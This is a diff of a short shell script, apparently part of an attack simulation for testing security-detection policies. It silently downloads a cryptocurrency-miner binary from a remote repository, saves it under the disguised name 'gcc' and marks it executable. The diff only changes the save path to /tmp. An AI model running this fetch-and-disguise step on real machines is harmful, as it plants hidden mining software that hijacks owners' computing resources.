@@ -1,6 +1,6 @@
 #!/bin/sh
 
-TARGET=/usr/local/bin/gcc
+TARGET=/tmp/gcc
 
 curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/binaries/cgminer -o $TARGET -s
 chmod +x $TARGET
